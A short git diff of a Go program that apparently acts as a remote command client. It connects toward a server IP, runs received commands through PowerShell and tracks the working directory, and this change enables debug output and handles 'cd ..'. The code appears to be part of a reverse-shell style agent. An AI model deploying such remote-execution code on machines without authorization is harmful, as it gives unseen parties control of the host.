@@ -21,7 +21,7 @@ var terminator = "__END__\n"
 var detectedOs string
 var myIP string
 var currentDir string;
-var debug = false;
+var debug = true;
 
 /**
 function that handles errors so I don't have to write ts EVERY SINGLE TIME
@@ -101,10 +101,17 @@ func RunLogged(cmd string) {
 
 	if runtime.GOOS == "windows" {
 		if(strings.Contains(cmd, "cd")) {
-			currentDir = cmd[3:]
+			if(strings.Compare(cmd, "cd ..") != 0) {
+				currentDir = cmd[3:]
+			} else {
+				temp := strings.LastIndex(currentDir, "\\")
+				if(temp != -1) { currentDir = currentDir[:temp] }
+			}
+			
 			if(debug) { fmt.Println("currentdir: " + currentDir) }
 			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", cmd)
 		} else {
+			if(debug) {fmt.Println(currentDir)}
 			out = exec.Command("powershell.exe","-NoProfile", "-NonInteractive", "-Command", "cd " + currentDir + "; " + cmd)
 		}
 	} else {
@@ -147,7 +154,7 @@ func main() {
 
 	if (debug) { fmt.Println("Initializing Client...") } 
 	detectOs()
-	
+
 	go initListener(serverIP)
 
 	<-sigs 
